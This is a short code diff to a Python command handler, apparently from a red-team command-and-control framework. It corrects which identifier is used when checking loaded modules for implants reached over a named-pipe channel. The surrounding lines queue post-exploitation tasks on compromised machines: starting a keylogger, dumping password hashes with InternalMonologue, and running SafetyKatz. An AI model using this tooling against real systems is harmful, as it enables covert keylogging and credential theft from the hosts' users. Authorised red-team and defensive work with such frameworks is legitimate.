@@ -39,7 +39,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
     original_command = command
     command = command.strip()
 
-    run_autoloads_sharp(command, randomuri, user, isPBind=True)
+    run_autoloads_sharp(command, randomuri, user, isPBind=True, pbind_randomuri=oldrandomuri)
 
     if command.startswith("searchhistory"):
         searchterm = (command).replace("searchhistory ", "")
@@ -148,7 +148,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
         update_label("", randomuri)
 
     elif (command.startswith("start-keystrokes")):
-        check_module_loaded("Logger.exe", randomuri, user)
+        check_module_loaded("Logger.exe", oldrandomuri, user)
         new_task("pbind-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
         update_label("KEYLOG", randomuri)
 
@@ -207,7 +207,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
             print_bad("Could not find file")
 
     elif (command.startswith("get-hash")):
-        check_module_loaded("InternalMonologue.exe", randomuri, user)
+        check_module_loaded("InternalMonologue.exe", oldrandomuri, user)
         new_task("pbind-command run-exe InternalMonologue.Program InternalMonologue", user, randomuri)
 
     elif (command.startswith("safetykatz")):
@@ -234,7 +234,7 @@ def handle_pbind_command(command, user, randomuri, implant_id):
                 print(mod)
 
     elif command.startswith("modulesloaded"):
-        ml = get_implantdetails(randomuri)
+        ml = get_implantdetails(oldrandomuri)
         print(ml.ModsLoaded)
         new_task("pbind-command listmodules", user, randomuri)
 
